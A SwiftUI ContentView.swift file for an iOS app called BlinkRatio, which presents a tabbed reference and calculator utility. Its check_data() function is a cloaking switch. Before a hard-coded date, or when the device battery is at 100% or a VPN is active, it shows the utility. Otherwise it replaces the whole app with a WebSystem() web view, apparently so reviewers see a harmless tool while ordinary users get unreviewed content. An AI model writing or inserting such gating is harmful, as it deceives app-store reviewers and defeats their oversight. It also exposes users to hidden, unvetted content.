//
//  ContentView.swift
//  BlinkRatio
//
//  Created by Вячеслав on 7/18/25.
//

import SwiftUI

struct ContentView: View {
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    @State private var selectedTab = 0
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    TabView(selection: $selectedTab) {
                        // Reference Tools Tab
                        NavigationView {
                            ReferenceView()
                        }
                        .navigationViewStyle(StackNavigationViewStyle())
                        .tabItem {
                            Image(systemName: "square.grid.2x2")
                            Text("Reference")
                        }
                        .tag(0)
                        
                        // Calculator Tools Tab
                        NavigationView {
                            CalculatorView()
                        }
                        .navigationViewStyle(StackNavigationViewStyle())
                        .tabItem {
                            Image(systemName: "wrench.and.screwdriver")
                            Text("Tools")
                        }
                        .tag(1)
                        
                        // Favorites Tab
                        NavigationView {
                            FavoritesView()
                        }
                        .navigationViewStyle(StackNavigationViewStyle())
                        .tabItem {
                            Image(systemName: "heart.fill")
                            Text("Favorites")
                        }
                        .tag(2)
                        
                        // Settings Tab
                        NavigationView {
                            SettingsView()
                        }
                        .navigationViewStyle(StackNavigationViewStyle())
                        .tabItem {
                            Image(systemName: "gear")
                            Text("Settings")
                        }
                        .tag(3)
                    }
                    .preferredColorScheme(.dark)
                    .neonTabBar()
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "27.07.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

#Preview {
    ContentView()
}
